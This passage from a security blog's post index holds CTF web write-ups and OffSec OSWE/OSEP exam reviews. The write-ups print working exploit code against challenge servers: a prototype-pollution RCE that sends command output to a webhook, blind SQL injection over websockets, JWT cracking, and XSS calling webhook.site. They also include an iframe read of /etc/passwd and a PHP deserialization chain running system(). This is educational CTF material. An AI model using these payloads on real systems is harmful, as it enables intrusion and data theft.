/proc/self/fd/3 instead of using any of the BANNED_STRINGS such as .ts or app.import requestsbody = {\"data\":{\"signed.name\":\"jeff\",\"signed.animalType\":\"emu\",\"signed.age\":12,\"signed.crime\":\"assault\",\"signed.description\":\"clotheslined someone with their neck\",\"signed.start\":\"2024-03-02T10:45:01Z\",\"signed.release\":\"2054-03-02T10:45:01Z\",\"signed.__proto__\":{\"outputPrefix\":\"../../proc/self/fd/3\\00\"}},\"signature\":\"718494ab34fb37e1adeea4b4c87de8feb9aa504310d8c67af693928d6377af13\"}r = requests.post(\"http://localhost:1337/convert-to-yaml\",json=body)print(r.text)D. Crash and RCEBefore we start thinking what to write in index.ts, let’s look for a way to restart the server. Using simple google search, I found the following article.Let’s try upload with the following payload. It’s not working..import requestscrash_payload = \"A\"*100000body = {\"data\":{\"random\":crash_payload,\"signed.name\":\"jeff\",\"signed.animalType\":\"emu\",\"signed.age\":12,\"signed.crime\":\"assault\",\"signed.description\":\"clotheslined someone with their neck\",\"signed.start\":\"2024-03-02T10:45:01Z\",\"signed.release\":\"2054-03-02T10:45:01Z\",\"signed.__proto__\":{\"outputPrefix\":\"hijack\\u0000\"}},\"signature\":\"718494ab34fb37e1adeea4b4c87de8feb9aa504310d8c67af693928d6377af13\"}r = requests.post(\"http://localhost:1337/convert-to-yaml\",json=body)print(r.text)# └─$ python3 crash.py# Payload Too LargeLooking into the offical writeup, by sending /dev/urandom will crash the apps with the following error.curl -F 'file=@/dev/urandom' -H 'Content-Type: application/json' -X POST http://localhost:1337/convert-to-yamlAlso, it’s possible to crash it by writing over non-existed files in /proc\"outputPrefix\":\"../../../../proc/notexist\"Below is the full code to get the flagimport requests# Get Signature + examplesbody = requests.get(\"https://&lt;TARGET_SERVER&gt;/examples\").json()[\"examples\"][0]signature = body[\"signature\"]# Write RCE payload to index.tbody[\"data\"][\"signed.__proto__\"] = {\"outputPrefix\":\"../../proc/self/fd/3\\00\"}payload = { \"data\": { # Put this line first as it will be at the top line \"const a\": \"string = new TextDecoder().decode(Bun.spawnSync([\\\"/bin/bash\\\", \\\"-c\\\", \\\"/bin/getflag\\\"]).stdout);fetch(\\\"https://&lt;WEBHOOK&gt;&gt;?=\\\"+a)/*\", **body[\"data\"], \"nothing\": \"nothing */\" }, \"signature\": signature}r = requests.post(\"https://&lt;TARGET_SERVER&gt;/convert-to-yaml\",json=payload)# Crash + Restartbody[\"data\"][\"signed.__proto__\"] = {\"outputPrefix\":\"../../proc/notexist\"}r = requests.post(\"https://&lt;TARGET_SERVER&gt;/convert-to-yaml\",json=body)Flag: DUCTF{bUnBuNbUNbVN_hOn0_tH15_aPp_i5_d0n3!!!one1!!!!}References https://github.com/DownUnderCTF/Challenges_2024_Public/tree/main/web https://jamvie.net/posts/2024/07/ductf-2024-prisoner-processor/" }, { "title": "Intigriti CTF 2023 Writeup [WEB]", "url": "/posts/IntigritiCTF-2023-Writeup/", "categories": "ctf", "tags": "ctf, writeup", "date": "2023-11-19 08:00:00 +0800", "snippet": "Link to archive challenges: https://github.com/sajjadium/ctf-archives/tree/main/ctfs/1337UP/2023Category : WebWeb : Bug Report RepoBrowsing the web challenge, we will encounter with a page that show the “Bug Reports”. There is one visible search box that we can use to check the report status by using BUG IDWhen we enter BUG ID == 1 we can see the page highligted the first row but where is the user Alice coming from? Probably its query something behind this.How about if we try to insert single quote ' instead? We got an error? Is there SQL Injection involved in here?Let’s try put a custom query to make it response with correct and wrong response.Correct Response1 OR 1=1Wrong Response1 AND 1=2Since we know it involve SQL INJECTION, next step is to find where is the flag located? It was mentioned in the challenge’s description that it received a CRITICAL bug but it was not shown in the system. When we try to check on BUG ID == 11 we receive an unusual user in the response.Probably we will get hints when we look into this user’s description. To do that we need exploit the SQL Injection and extract the description of bug id equal to 1. We can create an automation script to extract it. We also identified that its using WEBSOCKETS for the request.Below are the full scripts to extract the description of BUGID == 11import string, base64from websockets.sync.client import connectdef sqli(ws,q_left,chars):\t data = \"\"\"{\"id\":\"11 and (%s='%s')\"}\"\"\" % (q_left, chars) ws.send(data) temp = ws.recv() return \"Open\" in tempdef exploit_websockets(TARGET): dumped = \"\" with connect(TARGET) as ws: sql_template = \"SELECT substr(description, %s, 1)\" i = 1 while True: for chars in string.printable: if sqli(ws,sql_template%i,chars): dumped += chars print(dumped) i+=1 break if __name__ == \"__main__\": TARGET = \"wss://bountyrepo.ctf.intigriti.io/ws\" exploit_websockets(TARGET)Extracted : crypt0:c4tz on /4dm1n_z0n3, really?Browsing /4dm1n_z0n3 will get us into a secure admin login page.Using the credentials we found will get us into this page. Sadly our user crypt0 don’t have the permission to view the config key.When we look at the cookies, it looks like JWT and yes it is. It using alg == HS256eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZGVudGl0eSI6ImNyeXB0MCJ9.zbwLInZCdG8Le5iH1fb5GHB5OM4bYOm8d5gZ2AbEu_IBy reading in the Hacktricks we probably need to crack the JWT and find the secret key? Let’s give it a try using jwtcrack Algorithm HS256 : Uses the secret key to sign and verify each message# jwt2john./jwt2john.py \"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZGVudGl0eSI6ImNyeXB0MCJ9.zbwLInZCdG8Le5iH1fb5GHB5OM4bYOm8d5gZ2AbEu_I\" &gt; hash# johnjohn hash --wordlist=/usr/share/wordlists/rockyou.txtFound : catsarethebestNext, we can easily modify our JWT in here with the secret key we found.And we get the flag!Flag : INTIGRITI{w3b50ck37_5ql1_4nd_w34k_jw7}Web : My MusicI didn’t managed to solve this challenge during the event but it’s a good practice to solve an unsolved challenge after the event. Thanks to all of the writeup from others CTF players!We can see that there are Login and Register tabs at the top of the pageLet’s try register an account first.We have login hash, update function and generate profile card which could help us to look for vulnerability in this page.The login page only receive the login hash to login. A valid hash will lead us to the home page of the user, while invalid hash will give us an error. Nothing much I manage to find in this login page, so let’s move on to the update function.Invalid Login HashThe update function will send a PUT method to /api/user and there are three (3) parameters we can update in here.The generate function will send a POST method to /profile/generate-profile-card and there is no parameter used and it needs the cookies login_hashThe PDF generator will have all the value of parameters username,firstname,lastname,spotifyTrackCode.First thing come into my mind, is it a dynamic PDF generated? Will there be an injection related to server side? So mostly I referring in here while doing this challenge. So let’s try insert html injection in all the parameters that we can update and generate again the PDF.{ \"firstName\":\"&lt;h1&gt;firstName&lt;/h1&gt;\",\"lastName\":\"&lt;h1&gt;lastName&lt;/h1&gt;\",\"spotifyTrackCode\":\"&lt;h1&gt;spotifyTrackCode&lt;/h1&gt;\"}Nice, atleast one parameter spotifyTrackCode vulnerable to HTML Injection. But is it just a normal HTML Injection? Let’s try insert one XSS that try request to our webhook.&lt;img src=x onerror=fetch('https://webhook.site/edf38419-6f01-4b60-aa0e-2428b2089bef') /&gt;Nice we got a request!So now we know that it involve with server side, let’s use simple payload to read local file such as /etc/passwd&lt;iframe src=file:///etc/passwd height=2000 width=800&gt;&lt;/iframe&gt;So I tried to read almost all of the source code that I could find listed below:/app/app.js /app/package.json/app/routes/index.js /app/routes/api.js /app/views/register.handlebars/app/services/user.js/app/middleware/check_admin.js/app/middleware/auth.js/app/controllers/user.js/app/utils/generateProfileCard.js/app/views/print_profile.handlebars/app/data/{hash}.json/app/Dockerfile /etc/resolv.confTo get the flag, we need to access /admin with JSON body which impossible for us to update through the web UI.routes/index.jsrouter.get('/admin', isAdmin, (req, res) =&gt; { res.render('admin', { flag: process.env.FLAG || 'CTF{DUMMY}' })})middleware/check_admin.jsconst { getUser, userExists } = require('../services/user')const isAdmin = (req, res, next) =&gt; {let loginHash = req.cookies['login_hash']let userDataif (loginHash &amp;&amp; userExists(loginHash)) { userData = getUser(loginHash)} else { return res.redirect('/login')}try { userData = JSON.parse(userData) if (userData.isAdmin !== true) { res.status(403) res.send('Only admins can view this page') return }} catch (e) { console.log(e)}next()}module.exports = { isAdmin }The function getUser(loginHas) will get us better understanding on what userData.isAdmin is checking.services/user.jsconst fs = require('fs')const path = require('path')const { createHash } = require('crypto')const { v4: uuidv4 } = require('uuid')const dataDir = './data'// Register New User// Write new data in /app/data/&lt;loginhash&gt;.jsonconst createUser = (userData) =&gt; { const loginHash = createHash('sha256').update(uuidv4()).digest('hex') fs.writeFileSync( path.join(dataDir, `${loginHash}.json`), JSON.stringify(userData) ) return loginHash}// Update User// Update new data in /app/data/&lt;loginhash&gt;.jsonconst setUserData = (loginHash, userData) =&gt; { if (!userExists(loginHash)) { throw 'Invalid login hash' } fs.writeFileSync( path.join(dataDir, `${path.basename(loginHash)}.json`), JSON.stringify(userData) ) return userData}// Get User// Read /app/data/&lt;loginhash&gt;.jsonconst getUser = (loginHash) =&gt; { let userData = fs.readFileSync( path.join(dataDir, `${path.basename(loginHash)}.json`), { encoding: 'utf8', } ) return userData}// Check if UserExists// Check if file /app/data/&lt;loginhash&gt;.json existsconst userExists = (loginHash) =&gt; { return fs.existsSync(path.join(dataDir, `${path.basename(loginHash)}.json`))}So getUser() will get us the JSON value of our user which will holds parameters such as username,firstname,lastname,spotifyTrackCode as shown inside the codes below and there is no isAdmincontrollers/user.js...// Create User only accepts username, firstName, lastName// There is no isAdmin available in hereconst { username, firstName, lastName } = req.bodyconst userData = { username, firstName, lastName,}try { const loginHash = createUser(userData)...// Update user only accepts firstname, lastname, spotifyTrackCode// Also there is no isAdmin available in hereconst { firstName, lastName, spotifyTrackCode } = req.bodyconst userData = { username: req.userData.username, firstName, lastName, spotifyTrackCode,}try { setUserData(req.loginHash, userData)...One idea, that I had was to find a way to write the JSON payload with isAdmin into /app/data and use the cookies login_hash to load the .json file. Interestingly, inside the PDF generator function located in utils/generateProfileCard.js, there is a request body that we can send to add options into puppeteer pdf.routes/index.js// We can send userOptions in the bodyrouter.post('/profile/generate-profile-card', requireAuth, async (req, res) =&gt; { const pdf = await generatePDF(req.userData, req.body.userOptions) res.contentType('application/pdf') res.send(pdf)})utils/generateProfileCard.js...const generatePDF = async (userData, userOptions) =&gt; { const browser = await puppeteer.launch({ executablePath: '/usr/bin/google-chrome', args: ['--no-sandbox'], }) const page = await browser.newPage() ... let options = { format: 'A5', } // Our userOptions will be use to generate the PDF if (userOptions) { options = { ...options, ...userOptions } } const pdf = await page.pdf(options) ...}...Maybe this is the path for us to write the JSON with isAdmin? After reading the documentation in here, there is one options that we can use called path to output and save the file somewhere in locally.Let’s try save the our PDF in /app/data/test.json, then try read the file by generate the PDF.curl -k -X POST -H 'Content-Type: application/json' -b 'login_hash=f024b76b41f9dba21cf620484862e9b90465d8db09ea946fb04a0f6f3876103a' https://mymusic.ctf.intigriti.io/profile/generate-profile-card -d '{\"userOptions\":{\"path\":\"/app/data/test.json\"}}'Nice! We could write something using this method.Next step would be on how could we write the payload below somewhere in the server. We know that it will save as PDF not a JSON file in the content.{'username':'a','firstName':'a','lastName':'b','spotifyTrackCode':'c','isAdmin':'true'}What if we store this JSON in our webhook server and redirect it using XSS to reflect the content into the file? Let’s give it a try&lt;img src=x onerror=document.location='https://webhook.site/edf38419-6f01-4b60-aa0e-2428b2089bef'&gt;Let’s generate it and store it in /app/data/test.json. It still saved it as PDF format.But let’s give it a try to load it in login_hashFlag : INTIGRITI{0verr1d1ng_4nd_n0_r3turn_w4s_n3ed3d_for_th15_fl4g_to_b3_e4rn3d}" }, { "title": "TCP1PCTF 2023 - Un Secure [WEB]", "url": "/posts/TCP1PCTF-2023-Web-Unsecure/", "categories": "ctf", "tags": "ctf, writeup", "date": "2023-10-17 08:00:00 +0800", "snippet": "Link to archive challenges: https://github.com/TCP1P/TCP1P-CTF-2023-Challenges/tree/main/Web/Un%20SecureCategory : WebWeb : Un SecureWe received a zip file dist.zip with the source code of the web challenge.When we tried to browse the web link, we don’t see much except a white page with sentence “Welcome to my web app!”Looking at index.php, the code will check if cookies with name cookie is set. If set, it will unserialize() the cookies after base64 decode using base64_decode().&lt;?phprequire(\"vendor/autoload.php\");if (isset($_COOKIE['cookie'])) { $cookie = base64_decode($_COOKIE['cookie']); unserialize($cookie);}echo \"Welcome to my web app!\";A simple search dangerous of unserialize() php in Google will lead us into an interesting information.The name of the challenge itself is a hint that the challenge involve Deserialization vulnerabilities. In src/ folder, we can find few PHP files with three (3) gadgets that we can use to get a Remote Code Execution (RCE). Let’s walkthrough each of the gadgets availableGadgetOne (Adders.php)&lt;?phpnamespace GadgetOne { class Adders { private $x; function __construct($x) { $this-&gt;x = $x; } function get_x() { return $this-&gt;x; } }} __construct() - PHP class constructor, is automatically called upon object creation In GadgetOne, we can set the variable $x to any values that we want and interestingly it will return the value of variable $x in the function of get_x().GadgetTwo (Echoers.php)&lt;?phpnamespace GadgetTwo { class Echoers { protected $klass; function __destruct() { echo $this-&gt;klass-&gt;get_x(); } }} __destruct() - PHP class destructor, is automatically called when references to the object are removed from memory. In GadgetTwo, we can set the variable $klass and the function get_x() from GadgetOne was called in this gadget.GadgetThree (Vuln.php)&lt;?phpnamespace GadgetThree { class Vuln { public $waf1; protected $waf2; private $waf3; public $cmd; function __toString() { if (!($this-&gt;waf1 === 1)) { die(\"not x\"); } if (!($this-&gt;waf2 === \"\\xde\\xad\\xbe\\xef\")) { die(\"not y\"); } if (!($this-&gt;waf3) === false) { die(\"not z\"); } eval($this-&gt;cmd); } }} __toString() - PHP call-back that gets executed if the object is treated like a string. In GadgetThree, even though there is a WAF but we can defined each of the variable accordingly to bypass it. Once we have bypass it, we can get our input which is cmd to eval() function.SolutionBased on the Gadget above, at first I only focus on the GadgetThree because it got eval() function. But I keep wondering how can I trigger the __toString() with only using GadgetThree? Like I mentioned above, it will only get executed if the object is treated like a string, but in our case it only unserialize() the object not echo unserialize().unserialize($cookie);That’s when I realize we need to chain all the gadget to get RCE. Thanks to my team members in M53, I got some idea on how to chain the gadgets.This is the first solution my team member @vicevirus tried but he mentioned this is wrong. We will get back to this at the end to explain the reason.So the idea is I need to get my Vuln() object into the GadgetTwo as it use echo().# Originalecho $this-&gt;klass-&gt;get_x();# Planecho $this-&gt;klass-&gt;Vuln();Then, I realize that get_x() will return the value of variable $x and with this I come out with the solution below:&lt;?phprequire(\"vendor/autoload.php\");$gadgetOne = new \\GadgetOne\\Adders(1);$gadgetTwo = new \\GadgetTwo\\Echoers();$gadgetThree = new \\GadgetThree\\Vuln();// Setup GadgeThree$vuln = new \\GadgetThree\\Vuln();$reflection = new \\ReflectionClass($gadgetThree);$property = $reflection-&gt;getProperty('waf1');$property-&gt;setAccessible(true);$property-&gt;setValue($vuln, 1);$property = $reflection-&gt;getProperty('waf2');$property-&gt;setAccessible(true);$property-&gt;setValue($vuln, \"\\xde\\xad\\xbe\\xef\");$property = $reflection-&gt;getProperty('waf3');$property-&gt;setAccessible(true);$property-&gt;setValue($vuln, false);$property = $reflection-&gt;getProperty('cmd');$property-&gt;setAccessible(true);$property-&gt;setValue($vuln, \"system('cat *.txt');\");// Setup GadgetOne// __construct($x)$adders = new \\GadgetOne\\Adders(1);$reflection = new \\ReflectionClass($gadgetOne);$property = $reflection-&gt;getProperty('x');$property-&gt;setAccessible(true);$property-&gt;setValue($adders, $vuln);// Setup GadgetTwo// __destruct()$echoers = new \\GadgetTwo\\Echoers();$reflection = new \\ReflectionClass($gadgetTwo);$property = $reflection-&gt;getProperty('klass');$property-&gt;setAccessible(true);$property-&gt;setValue($echoers, $adders);$serialized = serialize($echoers);echo base64_encode($serialized);echo \"\\n\";Use curl with the base64 cookies and we will get the flag!curl \"http://ctf.tcp1p.com:45678/\" -b \"cookie=TzoxNzoiR2FkZ2V0VHdvXEVjaG9lcnMiOjE6e3M6ODoiACoAa2xhc3MiO086MTY6IkdhZGdldE9uZVxBZGRlcnMiOjE6e3M6MTk6IgBHYWRnZXRPbmVcQWRkZXJzAHgiO086MTY6IkdhZGdldFRocmVlXFZ1bG4iOjQ6e3M6NDoid2FmMSI7aToxO3M6NzoiACoAd2FmMiI7czo0OiLerb7vIjtzOjIyOiIAR2FkZ2V0VGhyZWVcVnVsbgB3YWYzIjtiOjA7czozOiJjbWQiO3M6MjA6InN5c3RlbSgnY2F0ICoudHh0Jyk7Ijt9fX0=\"Explanation (Lesson Learned)I really hope the solution by my team member (vicevirus) is working. I’m interested to know if its possible to include system() or any function in PHP object.&lt;?phprequire(\"vendor/autoload.php\");$gadgetOne = new \\GadgetOne\\Adders(system('id'));$gadgetTwo = new \\GadgetTwo\\Echoers();$reflection = new \\ReflectionClass($gadgetTwo);$property = $reflection-&gt;getProperty('klass');$property-&gt;setAccessible(true);$property-&gt;setValue($gadgetTwo, $gadgetOne);$serializedGadgetTwo = serialize($gadgetTwo);echo(base64_encode($serializedGadgetTwo));When we run the payload above, we will see that somehow the command executed.curl \"http://ctf.tcp1p.com:45678/\" -b \"cookie=TzoxNzoiR2FkZ2V0VHdvXEVjaG9lcnMiOjE6e3M6ODoiACoAa2xhc3MiO086MTY6IkdhZGdldE9uZVxBZGRlcnMiOjE6e3M6MTk6IgBHYWRnZXRPbmVcQWRkZXJzAHgiO3M6MjE1OiJ1aWQ9MTAwMChrYWxpKSBnaWQ9MTAwMChrYWxpKSBncm91cHM9MTAwMChrYWxpKSw0KGFkbSksMjAoZGlhbG91dCksMjQoY2Ryb20pLDI1KGZsb3BweSksMjcoc3VkbyksMjkoYXVkaW8pLDMwKGRpcCksNDQodmlkZW8pLDQ2KHBsdWdkZXYpLDEwMCh1c2VycyksMTA2KG5ldGRldiksMTExKGJsdWV0b290aCksMTE3KHNjYW5uZXIpLDE0MCh3aXJlc2hhcmspLDE0MihrYWJveGVyKSI7fX0=\"Im not an expert with Deserialization, but let us do some checking with the PHP Object itself.# Base64 Encoded BbjectTzoxNzoiR2FkZ2V0VHdvXEVjaG9lcnMiOjE6e3M6ODoiACoAa2xhc3MiO086MTY6IkdhZGdldE9uZVxBZGRlcnMiOjE6e3M6MTk6IgBHYWRnZXRPbmVcQWRkZXJzAHgiO3M6MjE1OiJ1aWQ9MTAwMChrYWxpKSBnaWQ9MTAwMChrYWxpKSBncm91cHM9MTAwMChrYWxpKSw0KGFkbSksMjAoZGlhbG91dCksMjQoY2Ryb20pLDI1KGZsb3BweSksMjcoc3VkbyksMjkoYXVkaW8pLDMwKGRpcCksNDQodmlkZW8pLDQ2KHBsdWdkZXYpLDEwMCh1c2VycyksMTA2KG5ldGRldiksMTExKGJsdWV0b290aCksMTE3KHNjYW5uZXIpLDE0MCh3aXJlc2hhcmspLDE0MihrYWJveGVyKSI7fX0=# Base64 Decoded ObjectO:17:\"GadgetTwo\\Echoers\":1:{s:8:\"*klass\";O:16:\"GadgetOne\\Adders\":1:{s:19:\"GadgetOne\\Addersx\";s:215:\"uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev),111(bluetooth),117(scanner),140(wireshark),142(kaboxer)\";}So basically, it will stored the value of our system('id') into the PHP object and output it later :( . But overall, I learn something new with most of the challenge in this CTF :)" }, { "title": "Offsec Web Expert OSWE Review", "url": "/posts/Offsec-Web-Expert-OSWE-Review/", "categories": "review", "tags": "certification, certification, oswe", "date": "2023-10-01 08:00:00 +0800", "snippet": "IntroductionAfter completing my OSEP exam in June, I didn’t expect to take another Offsec certication so soon. But, my team won the Asia Pacific Cyberattack Response Challenge 2023 and we were awarded Offsec vouchers as prizes. Thanks to Cyber8lab and Offsec for sponsoring these prizes!The Offensive Security web Expert (OSWE) certification, formerly known as Advanced Web Attacks and Exploitation (WEB-300), is an advanced web application security course that teaches the skills needed to conduct white box web app penetration tests. If you are pursuing the Offensive Certified Expert (OSCE3), OSWE can be your first or next step in your certification journey.You can get the full syllabus for OSWE (WEB-300) in here.Once you buy the course, you’ll receive access to course materials such as PDFs, videos, and labs. In my opinion, I think you should have enough time with the 90-day period to go through all the course materials and complete the labs.For more details, Offsec already provide more explanation in hereLabsCompared to the OSEP, the OSWE labs do not provide any flags for you to read and submit on their platform. But you will be able to hands-on in their labs and review the source code of each of the vulnerable web application.Personally, I found it quite overwhelming as each of the labs contains thousands lines of code. Therefore, it’s important to take your time to understand and exploit the vulnerabilities. The OSWE materials include walkthroughs for each of the labs, so I mainly went through the materials first and then proceeded with the labs.During the first month, I manage to complete the first 5 modules with their labs and try to create an exploitation scripts for each of the labs. In the final month, I completed all the materials and some of the labs due to the time constraints that I have.The most important part is to ensure all scripts, notes, references are well-documented on your machine. I’m using Visual Studio Code on my Kali machine to easily go through my exploitation scripts and notes which I can easily grep later using the following structure: CTF - Folder where I put all the scripts I encountered while playing CTF FastCopy - Folder where I will put all the important function that I can easily copy to start my exploitation scripts HTB_Others - Folder where I put all the full chain exploitation scripts for HTB labs or any vulnerable web app I encountered in the internet Labs - Folder where I put all the exploitation scripts for OSWE labsBut still, CherryTree will be the main app for my note taking 😁ExamI scheduled my exam on Sunday, 24 September at 5 AM (Malaysia time). The main reason why I chose 5 AM because I had just returned from Singapore after attending Bsides Singapore on Saturday, 23 September. Fortunately, I made it back to Malaysia one day before the exam. I went to bed early, around 9 PM without touching my computer and when I woke up around 3.30 AM, my anxiety spiked because my computer suddently wouldn’t turn on.After do some magic touch, it works for now atleast. I can only hope it will not suddenly turn off during the exam. Before the exam, you need to ensure that you have checked all the necessary requirements before beginning your exam. As usual, all the information can be found on the Offsec website in here.The exam will last for 48 hours, as mentioned on the Offsec website. However, according to the website, the actual duration is 47 hours and 45 minutes. So mine started at 5 AM (September 24th) and end around 5 AM (September 26th). As stated in one of the FAQs in Offsec website, you must achieve a minimum scope of 85 points to pass the exam and you can get maximum of 100 points available on the exam.I highly suggest for you to READ multiple times the Exam Restrictions. Also, to take note that you can’t download ANY applications, files or source code from the exam environment to your local machine as its strictly forbidden.I utilize all of the 48 hours to get enough points to pass the exam. The most important thing is to ensure all of the evidence, commands, payloads already in your notes. I put all the steps and evidence in a Microsoft Word and use the report template provided by Offsec as my final report. I did mentioned in my OSEP review, I prefer Microsoft Word because it give you flexibility to customize your report and I love to add page break on every sub headers just to make your report looks nice. I also did refer to this OSWE Exam Report Template Markdown owned by noraj and I highly recommend to check it out.During the exam, I also highly recommended for you to use the revert as many times as you can. Especially when you want to test your exploit, please revert it first then run the scripts. This will help you be more confident that your exploit is working fine on the target machine.Tips and RecommendationThere are several platforms you can use to find answers to any of your questions before the actual exam. I will list all the platforms I used to gather information prior to the exam. OffSec FAQs Reddit - OSWE OffSec - Discord OffSec - ForumThanks to the community, there are a lot of cheatsheets that you can refer to prepare for the OSWE. OSWE Resources #1 Exploit Writing Pentesterlab - CodeReview OWASP CheatSheets WhiteBox Pentest 0 Click HTB 4 Vulnerable Web App OSWE Resources #2While doing any OffSec Exam, I always reward myself with a break when I manage to increase my points. Usually I will take a break of atleast 1 hour once I’ve earned some points. Also, do utilize the debug machine and implement all the knowledge from the course materials with using WhiteBox/BlackBox testing. If you are stuck at something, allocate minimum of 3 hours and maximum of 5 hours to stop and start looking at different places.If you are looking for different kinds of reverse shell payload to generate in Python3, do check out my EzpzShell. I hope it will help you in some ways 😬What’s next?After sending my report on 26 September, I finally received the email saying that I passed the exam on 28 September!I have been enjoying doing various Web CTF challenges with my M53 team. Currently, I interested to research on web application and plan to delve deeper into this field moving forward. At the same time, I’m planning to allocate my time to study binary exploitation as preparation for OSED next year. I wish everyone best of luck with your OSWE certification!Other OSWE Review OSWE Review &amp; Exam Preparation Guide InfosecWriteup - OSWE Exam Review and Tips OSWE Guide in 2021 An Honest OSWE 2023 Review OffSec - OSWE Review" }, { "title": "Offensive Security Experienced Pentester OSEP Review", "url": "/posts/Offensive-Security-Experienced-Pentester-OSEP-Review/", "categories": "review", "tags": "certification, certification, osep", "date": "2023-06-10 08:00:00 +0800", "snippet": "IntroductionThe Offensive Security Experienced Penetration Tester (OSEP) certification, formerly known as Evasion Techniques and Breaching Defenses (PEN-300), is an advanced penetration testing course offered by Offensive Security. The course focuses on developing advanced skills and techniques in penetration testing, with a particular emphasis on bypassing security mechanisms. Some of the topics covered in the course include phishing techniques, lateral movement within a network, privilege escalation, and attacking Active Directory environments. If you’ve already obtained your OSCP certification, I highly recommend taking the OSEP course as the next step in your career journey.You can get the full syllabus for OSEP (PEN-300) in here.Once you buy the course, you’ll receive access to course materials such as PDFs, videos, and labs. In my opinion, I think you should have enough time with the 90-day period to go through all the course materials and complete the labs.For more details, Offsec already provide more explanation in hereLabsWhat I love most about the Offsec courses, including OSEP, is the good lab experience they provide. Just like my time with OSCP, I had a great time working on the labs in OSEP. The hands-on of the labs really enhances the learning process and lets you put your skills into action. It’s something that I genuinely enjoy and find extremely valuable in the course.The labs in OSEP are divided into six challenges. Some of these labs concentrate on specific topics, giving you practice in those areas. Meanwhile, there are labs that simulate smaller internal networks, where your goal is to compromise them. These internal networks you can expect to have security mechanisms, Active Directory environments, and lateral movement.During the first month, my main focus is to finish reading the course materials (PDFs and videos). In the second and third months, I dedicate my time to repeatedly solving all six challenges, using different payloads, tools, or techniques. I highly recommend taking notes of all commands or payloads in your notebook, as they can be useful references during the exam.If you are asking me about note taking apps, I really love using CherryTree now 😁ExamInitially, I had scheduled my exam for June 6th, but I decided to reschedule it to June 5th, one day earlier. The main reason for this change is that I have a lot of free time during the weekend, and Monday happens to be a public holiday in Malaysia. Waiting for the exam day can make the days feel longer, and I wanted to make the most of my available time.Before the exam, you need to ensure that you have checked all the necessary requirements before beginning your exam. As usual, all the information can be found on the Offsec website in here.The exam will last for 48 hours, as mentioned on the Offsec website. However, according to the website, the actual duration is 47 hours and 45 minutes. So mine started at 2 PM (June 5th) and end around 2 PM (June 7th). As stated in one of the FAQs in Offsec website, there are 2 ways you can pass the exam, either you achieve the objective provided on the control panel (secret.txt) or obtain at least 100 points. 1 Flag = 10 Points. So 10 Flags = 100 Points. Can read the FAQs in hereI utilize all of the 48 hours to get enough points to pass the exam. The most important thing is to ensure all of the evidence, commands, payloads already in your notes. I put all the steps and evidence in a Microsoft Word and use the report template provided by Offsec as my final report. The reason why I prefer Microsoft Word because it give you flexibility to customize your report and I love to add page break on every sub headers just to make your report looks nice. I also did refer to this OSEP Exam Report Templatee Markdown owned by noraj and I highly recommend to check it out.Tips and RecommendationThere are several platforms you can use to find answers to any of your questions before the actual exam. I will list all the platforms I used to gather information prior to the exam. OffSec FAQs Reddit - OSEP OffSec - Discord OffSec - ForumThanks to the community, there are a lot of cheatsheets that you can refer to prepare for the OSEP. OSEP Code Snippets OSEP Notes #1 OSEP Notes #2 OSEP Notes #3 Mayfly - Game Of Active Directory v2 MindMap - Pentesting Active Directory CheatSheets - Active Directory HackTricks - Linux Active Directory HackTricks - Active Directory Methodology Windows &amp; Active Directory Exploitation Cheat SheetAlso, I would like to promote a tool that might be helpful in Active Directory called PowerView.py. The project mainly created by my friend @aniqfakhrul and I am one of the contributor. This tool might be helpful in some ways during your Active Directory Enumeration or Exploitation. For some documentation on how to use the tool, you can check the Wiki in herePlease make sure to get enough sleep and do not skip your breakfast, lunch, or dinner. Getting proper rest and sleep will help reduce stress and may provide you with more ideas if you encounter any challenges. As stated in the OffSec Exam Guide: You are expected to take rest breaks, eat, drink, and sleepLastly, if you enjoy listening to music or songs, you can always have them playing during the exam. However, it is important to ask for permission from your proctor beforehand. Personally, I find that listening to Lofi helps me relax while taking the exam.What’s next?After sending the report on the same day of my last day (June 7th), I keep refreshing my email since then.On the night of June 8th, I finally received the email saying that I passed the exam. This certification has always been something I wanted, and I never thought I would actually get it. I know I still have a lot to learn and I’m not an expert, but I enjoy learning and that’s what matters. Now that I have OSEP, I’m thinking of going for the OSCE3 certification next. The OSWE will be the next certification I want to pursue!Other OSEP Review OSEP Tester PEN-300 Course Review Offensive Security Experienced Penetration Tester (OSEP) Review and Exam OSEP COURSE REVIEW Offensive Security OSEP Review Offensive Security Experienced Penetration Tester (OSEP) Review" }, { "title": "Intigriti - Challenge 1021 Writeup", "url": "/posts/Intigriti-Challenge-1021-Writeup/", "categories": "ctf", "tags": "ctf, writeup, intigriti", "date": "2023-06-02 08:00:00 +0800", "snippet": "This is my first attempt at the intigriti challenge. I’m writing this to learn and share my experience with others. I’ve included information from various sources to provide a comprehensive overview.Intigriti - Challenge 1021Link to challenge: https://challenge-1021.intigriti.io/By viewing the page source, we can observe that the iframe leads to challenge.php.&lt;div class=\"card-container\"&gt; &lt;iframe src=\"challenge/challenge.php\" width=\"100%\" height=\"700px\"&gt;&lt;/iframe&gt;&lt;/div&gt;Link to challenge.php: https://challenge-1021.intigriti.io/challenge/challenge.phpThe challenge page states that the html parameter can be utilized to convey messages.ARE YOU SCARED?ARE YOU STILL SANE?NOBODY CAN BREAK THIS!NOBODY CAN SAVE INTIGRITII USE ?html= TO CONVEY THESE MESSAGESI'LL RELEASE INTIGRITI FROM MY WRATH...... AFTER YOU POP AN XSSELSE, INTIGRITI IS MINETo verify this, we can send a simple value such as “POC” in the html parameter. Upon inspection, we can observe that the string “POC” is indeed reflected on the web page. https://challenge-1021.intigriti.io/challenge/challenge.php?html=POC&lt;div id=\"html\" class=\"text\"&gt;&lt;h1 class=\"light\"&gt;POC&lt;/div&gt;Let’s attempt HTML injection by testing with a basic HTML snippet to see if we can successfully inject HTML code into the page. Here’s an example of a test code: https://challenge-1021.intigriti.io/challenge/challenge.php?html=%3Ch1%3E%3Cs%3EPOC%3C/s%3E%3C/h1%3E&lt;h1&gt;&lt;s&gt;POC&lt;/s&gt;&lt;/h1&gt;By sending this code as the value for the html parameter, we can verify the HTML injection occurs.&lt;div id=\"html\" class=\"text\"&gt;&lt;h1 class=\"light\"&gt;&lt;h1&gt;&lt;s&gt;POC&lt;/s&gt;&lt;/h1&gt;&lt;/div&gt;However, it seems that even though the &lt;script&gt; tag is not filtered, a simple XSS code like below does not execute as expected.&lt;div id=\"html\" 